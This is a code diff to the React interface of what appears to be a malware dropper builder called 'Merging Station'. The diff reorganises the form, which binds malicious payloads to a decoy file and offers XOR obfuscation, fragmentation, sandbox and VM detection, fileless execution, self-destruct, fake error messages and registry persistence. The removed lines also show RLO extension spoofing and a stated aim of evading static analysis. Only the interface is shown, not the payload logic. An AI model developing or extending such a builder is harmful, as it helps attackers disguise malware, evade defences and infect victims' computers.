@@ -57,6 +57,16 @@ const outputFormats = {
     'lnk': { name: 'Shortcut (.lnk)', extension: 'lnk', disabled: true },
 };
 
+const StepNumber = ({ number, children }: { number: number, children: React.ReactNode }) => (
+    <div className="flex items-center gap-4">
+        <div className="flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground text-lg font-bold">
+            {number}
+        </div>
+        <CardTitle className="text-lg">{children}</CardTitle>
+    </div>
+);
+
+
 export default function MergingStationPage() {
   const [buildLog, setBuildLog] = useState<string[]>([]);
   const [isBuilding, setIsBuilding] = useState(false);
@@ -218,9 +228,11 @@ export default function MergingStationPage() {
       <Form {...form}>
         <form onSubmit={form.handleSubmit(runBuildProcess)}>
           <div className="grid lg:grid-cols-3 gap-6 items-start">
-            <div className="lg:col-span-2 grid md:grid-cols-2 gap-6">
+            <div className="lg:col-span-2 space-y-6">
+              
+              {/* Step 1: Input Files */}
               <Card>
-                <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
+                <CardHeader><StepNumber number={1}>Input Files</StepNumber></CardHeader>
                 <CardContent className="space-y-4">
                   <div>
                     <Label>Malicious Payloads</Label>
@@ -239,93 +251,67 @@ export default function MergingStationPage() {
                     </div>
                     <Button type="button" variant="outline" size="sm" className="mt-2" onClick={() => append(undefined)}><PlusCircle className="mr-2 h-4 w-4"/>Add Another Payload</Button>
                   </div>
-
                   <Separator />
-
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                   <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
+              {/* Step 2: Configuration */}
               <Card>
-                <CardHeader><CardTitle className="text-lg">2. Dropper Configuration</CardTitle></CardHeader>
-                <CardContent className="space-y-4">
+                <CardHeader><StepNumber number={2}>Configuration</StepNumber></CardHeader>
+                <CardContent className="grid md:grid-cols-2 gap-4">
                   <FormField control={form.control} name="outputName" render={({ field }) => ( <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
                   <FormField control={form.control} name="outputFormat" render={({ field }) => ( <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem> )}/>
-                  <Separator />
-                  <Label>Dropper Behavior</Label>
-                   <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
-                   <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
-                     <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error Message</FormLabel></div></FormItem> )}/>
-                     {watchShowFakeError && (
-                        <FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>
-                     )}
                 </CardContent>
               </Card>
               
-               <div className="md:col-span-2 grid md:grid-cols-2 gap-6">
-                 <Card>
-                    <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
-                    <CardContent className="space-y-4">
-                         <FormField control={form.control} name="obfuscationType" render={({ field }) => (
-                            <FormItem className="space-y-3">
-                                <FormLabel>Encoding / Encryption</FormLabel>
-                                <FormControl>
-                                <RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex flex-col space-y-1">
-                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem>
-                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem>
-                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem>
-                                </RadioGroup>
-                                </FormControl><FormMessage />
-                            </FormItem>
-                            )}
-                        />
-                         {watchObfuscationType === 'xor' && (
-                            <FormField control={form.control} name="encryptionKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
-                         )}
-                         <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
-                    </CardContent>
-                 </Card>
-
-                 <Card>
-                    <CardHeader><CardTitle className="text-lg">4. Anti-Analysis</CardTitle></CardHeader>
-                    <CardContent className="space-y-4">
+              {/* Step 3: Evasion */}
+              <Card>
+                <CardHeader><StepNumber number={3}>Evasion Techniques</StepNumber></CardHeader>
+                <CardContent className="grid md:grid-cols-2 gap-6">
+                    <div className="space-y-4">
+                        <Label className="font-semibold">Crypter / Obfuscation</Label>
+                        <FormField control={form.control} name="obfuscationType" render={({ field }) => (<FormItem className="space-y-3"><FormControl><RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex flex-col space-y-1"><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem></RadioGroup></FormControl><FormMessage /></FormItem>)}/>
+                        {watchObfuscationType === 'xor' && (<FormField control={form.control} name="encryptionKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>)}
+                        <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks.</FormDescription></div></FormItem> )}/>
+                    </div>
+                     <div className="space-y-4">
+                        <Label className="font-semibold">Anti-Analysis</Label>
                         <FormField control={form.control} name="enableSandboxDetection" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Sandbox Detection</FormLabel><FormDescription>Check for VM environments before running.</FormDescription></div></FormItem> )}/>
-                        {watchEnableSandboxDetection && (
-                            <div className="space-y-3 pl-4 border-l ml-2">
-                                <FormField control={form.control} name="checkCpuCores" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check CPU Cores (&lt;= 2)</FormLabel></FormItem> )}/>
-                                <FormField control={form.control} name="checkRam" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check RAM (&lt; 4GB)</FormLabel></FormItem> )}/>
-                                <FormField control={form.control} name="checkVmProcesses" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check for VM Processes</FormLabel></FormItem> )}/>
-                                <FormField control={form.control} name="sandboxAbortMessage" render={({ field }) => ( <FormItem><FormLabel className="text-sm">Abort Message</FormLabel><FormControl><Textarea placeholder="The message to show if a sandbox is detected." {...field} /></FormControl></FormItem> )}/>
+                        {watchEnableSandboxDetection && (<div className="space-y-3 pl-4 border-l ml-2"><FormField control={form.control} name="checkCpuCores" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check CPU Cores (&lt;= 2)</FormLabel></FormItem> )}/><FormField control={form.control} name="checkRam" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check RAM (&lt; 4GB)</FormLabel></FormItem> )}/><FormField control={form.control} name="checkVmProcesses" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check for VM Processes</FormLabel></FormItem> )}/><FormField control={form.control} name="sandboxAbortMessage" render={({ field }) => ( <FormItem><FormLabel className="text-sm">Abort Message</FormLabel><FormControl><Textarea placeholder="The message to show if a sandbox is detected." {...field} /></FormControl></FormItem> )}/></div>)}
+                    </div>
+                     <div className="space-y-4 md:col-span-2">
+                        <Label className="font-semibold">Dropper Behavior</Label>
+                        <div className="grid md:grid-cols-2 gap-4">
+                           <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run in memory.</FormDescription></div></FormItem> )}/>
+                           <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct</FormLabel><FormDescription>Delete after run.</FormDescription></div></FormItem> )}/>
+                           <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
+                           <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4 h-full"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error</FormLabel></div></FormItem> )}/>
+                        </div>
+                        {watchShowFakeError && (<FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>)}
+                     </div>
+                </CardContent>
+              </Card>
+
+              {/* Step 4: Persistence (Optional) */}
+               <Card className={watchFileless ? 'opacity-50' : ''}>
+                    <CardHeader><StepNumber number={4}>Persistence (Optional)</StepNumber></CardHeader>
+                    <CardContent>
+                        <fieldset disabled={watchFileless} className="space-y-4">
+                            {watchFileless && <p className="text-sm text-amber-500 text-center -mt-2 mb-2">Persistence requires 'Fileless Execution' to be disabled.</p>}
+                            <FormField control={form.control} name="enablePersistence" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Persistence</FormLabel><FormDescription>Add payload to registry to run on system startup.</FormDescription></div></FormItem> )}/>
+                             <div className="grid md:grid-cols-2 gap-4">
+                                <FormField control={form.control} name="installPath" render={({ field }) => ( <FormItem><FormLabel>Install Location</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent><SelectItem value="TEMP">%TEMP%</SelectItem><SelectItem value="APPDATA">%APPDATA%</SelectItem><SelectItem value="SystemRoot">%SystemRoot% (Admin)</SelectItem></SelectContent></Select></FormItem> )}/>
+                                <FormField control={form.control} name="registryKeyName" render={({ field }) => ( <FormItem><FormLabel>Registry Key Name</FormLabel><FormControl><Input {...field} /></FormControl></FormItem> )}/>
                             </div>
-                        )}
+                        </fieldset>
                     </CardContent>
-                 </Card>
-
-               </div>
-
-                <div className="md:col-span-2 grid md:grid-cols-2 gap-6">
-                    <Card>
-                         <CardContent className="p-4 space-y-4">
-                            <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription className="text-xs">Use RLO character to mask the true file extension.</FormDescription></div></FormItem> )}/>
-                            <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct after Execution</FormLabel><FormDescription className="text-xs">Remove the dropper script after it runs.</FormDescription></div></FormItem> )}/>
-                         </CardContent>
-                    </Card>
-                    <Card className={watchFileless ? 'opacity-50' : ''}>
-                        <CardHeader className="pb-2"><CardTitle className="text-lg">5. Persistence</CardTitle></CardHeader>
-                        <CardContent className="space-y-4">
-                            <fieldset disabled={watchFileless}>
-                                <FormField control={form.control} name="enablePersistence" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Persistence</FormLabel><FormDescription>Add to registry to run on startup.</FormDescription></div></FormItem> )}/>
-                                <FormField control={form.control} name="installPath" render={({ field }) => ( <FormItem className="mt-4"><FormLabel>Install Location</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent><SelectItem value="TEMP">%TEMP%</SelectItem><SelectItem value="APPDATA">%APPDATA%</SelectItem><SelectItem value="SystemRoot">%SystemRoot% (Admin)</SelectItem></SelectContent></Select></FormItem> )}/>
-                                <FormField control={form.control} name="registryKeyName" render={({ field }) => ( <FormItem className="mt-4"><FormLabel>Registry Key Name</FormLabel><FormControl><Input {...field} /></FormControl></FormItem> )}/>
-                            </fieldset>
-                        </CardContent>
-                    </Card>
-                </div>
-
+                </Card>
 
             </div>
 
+            {/* Right Column */}
             <div className="lg:col-span-1 space-y-6">
                 <Button type="submit" className="w-full text-lg py-6" disabled={isBuilding}>
                     {isBuilding ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : <Binary className="mr-2 h-5 w-5" />}
@@ -361,3 +347,4 @@ export default function MergingStationPage() {
     </div>
   );
 }
+
